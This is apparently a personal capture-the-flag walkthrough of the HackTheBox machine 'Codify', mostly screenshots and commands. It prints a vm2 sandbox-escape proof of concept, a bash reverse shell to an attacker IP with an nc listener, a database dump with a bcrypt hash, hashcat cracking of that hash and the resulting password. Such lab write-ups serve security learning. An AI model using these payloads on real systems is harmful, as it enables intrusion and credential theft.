### 06-Apr-24-Sat

[Codify | HackTheBox](https://app.hackthebox.com/machines/Codify)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/2a62f921-2f8c-4617-95c8-1a2f4e3481d2)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1b31a4a9-b243-4dca-894a-b770e219e958)

*Walkthrough* - https://youtu.be/wH1Lp-sEVv4 (https://www.youtube.com/@ippsec)

```
sudo nmap -sC -sV -oA nmap 10.129.213.88
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/bd6b3705-a0a6-430e-b114-bd9b42b1223b)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/73bcec52-ccbe-42d0-a2e9-2f96f420fd9d)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1b629033-6cca-4906-80a9-1e65742fec59)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/919b6373-0ac7-4c35-9779-aebcc6b38cb8)

`codify.htb`

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/43939323-9e03-4dba-acd8-52a03c1c9456)

http://codify.htb/

http://codify.htb/editor

http://codify.htb/limitations

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b2902478-40d0-40ac-8767-a6f8143245fd)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9559fdfe-a0d4-48d7-affa-305826decf9b)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a3f7394d-6195-4e45-bf1c-11fc6701e2d3)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/fa2ae3d9-ce6a-4521-abdd-f7c671f27e02)

https://github.com/patriksimek/vm2/releases/tag/3.9.16

https://github.com/patriksimek/vm2/security

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/5c9d5151-a941-4d42-b3d7-d3116a7c1f1b)

https://github.com/patriksimek/vm2/security/advisories/GHSA-whpj-8f3w-67p5

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1a6f848d-7409-43a8-81f7-9551a67961b3)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b2754e25-73d7-4a77-9994-c47412a706c1)

https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b8684266-253e-441d-b540-5b38913b49d0)

### POC

```
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("echo hacked").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> hacked
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/2ce92345-3f77-4ff7-99f7-ee054d21a9b0)

https://www.revshells.com/

```
"bash -c 'sh -i >& /dev/tcp/10.10.16.12/443 0>&1'"
```

```
sudo nc -lvnp 443
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b5cec825-df53-4607-91de-4cd2cb9cb35a)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/48f585ef-793b-402b-aa48-36144106661e)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/01a4c184-403e-4df8-8040-2d4fa7058d15)

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```
stty raw -echo;fg
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/e5f076e7-0956-44ca-9257-e85c52d1704a)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/99b4f478-3b54-4751-9b2b-9a9b482eb213)

```
echo $TERM
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a38e5ade-416c-4043-aca4-adb574fd4dae)

```
ss -lntp
```

```
pm2 list
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1cdc2178-2d4d-4216-82fa-1d89068e0027)

```
ps -ef --forest |less -S
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/e1a20f76-1563-44c8-a6c2-1c461d20aa71)

```
stty -a
```

```
stty rows 28 cols 110
```

```
sqlite3 tickets.db .dump
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/938b8cbe-c7d8-44a7-b588-5524938a2c92)

```
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
    );
INSERT INTO users VALUES(3,'joshua','$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2');
CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT);
INSERT INTO tickets VALUES(1,'Tom Hanks','Need networking modules','I think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!','open');
INSERT INTO tickets VALUES(2,'Joe Williams','Local setup?','I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.','open');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',3);
INSERT INTO sqlite_sequence VALUES('tickets',5);
COMMIT;
```

```
hashcat -m 3200 joshua.hash /usr/share/wordlists/rockyou.txt
```

```
spongebob1
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1e811bf8-e7aa-4025-bde9-bb6d0308ff9d)

```
ssh joshua@codify.htb
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/f29aebbf-2ef9-46c4-9315-7a3c1f002738)

```
8d905687c899e53de3cdf0615d245805
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/0fa54d7c-ca5f-4a17-b1ec-52eb75722cc4)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/06e2f720-ae7e-40d1-8518-4a3b593fc9a9)

